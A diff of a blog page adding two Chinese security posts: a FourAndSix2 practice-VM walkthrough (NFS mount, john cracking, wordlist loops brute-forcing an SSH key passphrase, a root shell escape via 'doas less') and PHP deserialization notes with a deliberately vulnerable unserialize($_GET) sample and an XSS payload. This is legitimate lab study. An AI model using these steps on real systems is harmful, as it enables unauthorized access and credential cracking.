@@ -300,6 +300,490 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/30/靶机渗透/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/靶机渗透/" itemprop="url">靶机渗透</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T23:00:04+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-30T23:01:18+08:00">
+                2019-07-30
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulstudy/" itemprop="url" rel="index">
+                    <span itemprop="name">vulstudy</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2>fourandsix2靶机</h2>
+<p>一开机就可以看到IP地址位192.168.41.132</p>
+<p>然后nmap开始扫描
+<code>nmap -A -n -v -Pn -A 192.168.41.132</code>
+-A Enable OS detection, version detection, script scanning, and traceroute
+-n -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+-Pn  Treat all hosts as online -- skip host discovery</p>
+<p>扫描的报告：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.41.132</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)</span><br><span class="line">|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)</span><br><span class="line">|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: OpenBSD 6.X</span><br><span class="line">OS CPE: cpe:/o:openbsd:openbsd:6</span><br><span class="line">OS details: OpenBSD 6.0 - 6.1</span><br><span class="line">Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=258 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Randomized</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.59 ms 192.168.41.132</span><br></pre></td></tr></table></figure></p>
+<p>难得一次nmap可以扫出这么多信息
+看到靶机开放了2049号端口，是nfs服务，那么尝试扫描可以挂载的目录</p>
+<ul>
+<li>-sV : Probe open ports to determine service/version info</li>
+</ul>
+<p><code>nmap -sV --script=nfs-showmount 192.168.41.132</code>
+扫描可以挂载的目录</p>
+<p>结果：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| nfs-showmount:</span><br><span class="line">|_  /home/user/storage</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br></pre></td></tr></table></figure></p>
+<p>很好，那就可以挂载目录了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/</span><br><span class="line">nfspy@192.168.41.132:/home/user/storage:/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>nfspysh的用法：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -h</span><br><span class="line">Usage: nfspysh [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -l          List mount options available</span><br><span class="line">  -o OPTIONS  Mount options as in nfspy</span><br><span class="line">  -c COMMAND  Semicolon-separated commands to run (batch mode)</span><br></pre></td></tr></table></figure></p>
+<p>目录下有一个压缩包
+<code>get backup.7z</code>
+然后尝试用7z去解压缩，但是有密码</p>
+<p>于是用<code>john</code>去破解</p>
+<p>然而爆破有点慢</p>
+<p>不过密码就是<code>chocolate</code></p>
+<p>ps.kali里面其实有很多字典的，比如<code>/usr/share/john/password.lst</code></p>
+<p>解压缩之后得到的是一个公钥和私钥</p>
+<p>通过下面这段脚本爆破出密码是12345678
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure></p>
+<p>然后就可以登陆了
+<code>ssh -i id_rsa user@192.168.41.132</code></p>
+<p>之前一直尝试没登陆成功，因为我忘记赋权了
+也就是
+<code>chmod 600 id_rsa</code></p>
+<p>然后就可以登陆了：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">Enter passphrase for key &apos;id_rsa&apos;:</span><br><span class="line">Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114</span><br><span class="line">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018</span><br><span class="line"></span><br><span class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span><br><span class="line"></span><br><span class="line">Please use the sendbug(1) utility to report bugs in the system.</span><br><span class="line">Before reporting a bug, please try to reproduce it with the latest</span><br><span class="line">version of the code.  With bug reports, please try to ensure that</span><br><span class="line">enough information to reproduce the problem is enclosed, and if a</span><br><span class="line">known fix for it exists, include that as well.</span><br><span class="line"></span><br><span class="line">fourandsix2$</span><br></pre></td></tr></table></figure></p>
+<p>如下是错误的做法：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;id_rsa&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br></pre></td></tr></table></figure></p>
+<p>登陆之后</p>
+<p>没办法直接访问root文件夹
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2$ ls /root/</span><br><span class="line">ls: /root/: Permission denied</span><br></pre></td></tr></table></figure></p>
+<p>接下来这波操作很不明白</p>
+<p>输入
+<code>doas /usr/bin/less /var/log/authlog</code>
+然后按v进入编辑模式
+之后输入<code>:!/bin/sh</code></p>
+<p><img src="https://i.imgur.com/rU9dNJP.png" alt="four"></p>
+<p>于是就提权了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
+<p>成功了</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# cat /root/flag.txt                                                                                                                                             </span><br><span class="line">Nice you hacked all the passwords!</span><br><span class="line"></span><br><span class="line">Not all tools worked well. But with some command magic...:</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here is the flag:</span><br><span class="line">acd043bc3103ed3dd02eee99d5b0ff42</span><br></pre></td></tr></table></figure></p>
+<p>补充提权的过程：
+在<code>/etc/doas.conf</code>文件中有这些内容
+所以可以用<code>doas</code>命令查看<code>authlod</code>文件
+同时，通过编辑它，进入了shell</p>
+<p><img src="https://i.imgur.com/iZC9p7A.png" alt="doas"></p>
+<h1>参考</h1>
+<p><a href="https://www.freebuf.com/articles/web/194783.html" target="_blank" rel="noopener">FourAndSix2.01靶机渗透</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/30/php反序列化笔记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/php反序列化笔记/" itemprop="url">php反序列化笔记</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T22:54:28+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-30T22:56:08+08:00">
+                2019-07-30
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/note/" itemprop="url" rel="index">
+                    <span itemprop="name">note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  935
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1>php 反序列化</h1>
+<p>先看一个栗子：
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test1 = <span class="keyword">new</span> Test();</span><br><span class="line">$object = serialize($test1);</span><br><span class="line">print_r($object);</span><br></pre></td></tr></table></figure></p>
+<p>序列化之后得到的结果是：
+<code>O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></p>
+<p>O代表是对象，<code>Test</code>是类名，之后是属性，不同类型的属性其实序列化之后得到的结果是不一样的。</p>
+<p>看官方文档，解释了为什么需要序列化这种操作：</p>
+<blockquote>
+<p>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。
+这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p>
+</blockquote>
+<p>同时提到了一个魔术方法：</p>
+<blockquote>
+<p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</p>
+</blockquote>
+<p><code>__sleep()</code>和<code>__wakeup()</code>两个方法很形象地说明了什么时候调用。</p>
+<p>然后我就犯了一个新手很常见的错误：
+<code>__sleep()</code>方法必须是要返回一个<code>array</code>地
+<img src="https://i.imgur.com/pulCMhV.png" alt="php3"></p>
+<p>原来。。<code>__sleep()</code>方法是这样子调用的啊
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2>实际追踪一下为什么会出现反序列化</h2>
+<p>调试代码如下:
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"this is a test"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$c = unserialize($a);</span><br></pre></td></tr></table></figure></p>
+<p>利用思路：传入的参数是可控的，并且这里还有一个<code>test</code>类和一个<code>__destruct()</code>魔术方法。
+那就是构造这个对象将其序列化之后传入，之后会自动反序列化同时在对象销毁的时候就会自动执行魔术方法了</p>
+<p>我们这样来写：
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"&lt;script&gt;alert('xss');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">print_r(serialize($object));</span><br></pre></td></tr></table></figure></p>
+<p>突然觉得序列化也有一点变量覆盖的味道，我在外部构造的类实例化的对象进入代码之后覆盖了原来的对象？</p>
+<p>调试过程如下：</p>
+<p>生成的序列化字符串如下：
+<code>O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}</code>
+然后将其作为参数传入进去:</p>
+<p><code>http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;}</code></p>
+<p>此时接收到了参数：
+<img src="https://i.imgur.com/rbponzu.png" alt="php4">
+<code>$a</code>的值为：&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot;</p>
+<p>继续单步步入：
+这个时候就会去调用魔术方法了
+<img src="https://i.imgur.com/ozQZZiw.png" alt="php5"></p>
+<p>xss框框就弹出来啦。
+<img src="https://i.imgur.com/W3TNDdl.png" alt="xss3"></p>
+<p>接下来继续研究剩下的魔术方法：先看几个简单的</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString()"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用静态方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">test::hello(<span class="string">"nihao"</span>); <span class="comment">//不实例化对象，此时调用的是静态方法</span></span><br><span class="line">$test1-&gt;hello(<span class="string">"nihao"</span>); <span class="comment">//实例化对象</span></span><br><span class="line">$test2 = serialize($test1);</span><br><span class="line"></span><br><span class="line">$test3 = unserialize($test2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>($test3);</span><br></pre></td></tr></table></figure></p>
+<p>输出的结果如下：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">调用静态方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">调用方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">__sleep()</span><br><span class="line">__wakeup()</span><br><span class="line">__toString()</span><br><span class="line">__destruct()</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure></p>
+<p>这几个方法都还挺好区分的，比较难区分的就是<code>__call()</code>和<code>__callStatic()</code>方法了。</p>
+<p>TODO
+<a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">十六个魔术方法详解</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/30/php-manual-note-0/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2181,494 +2665,11 @@ exp如下：
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/22/php-challenge9/">
-
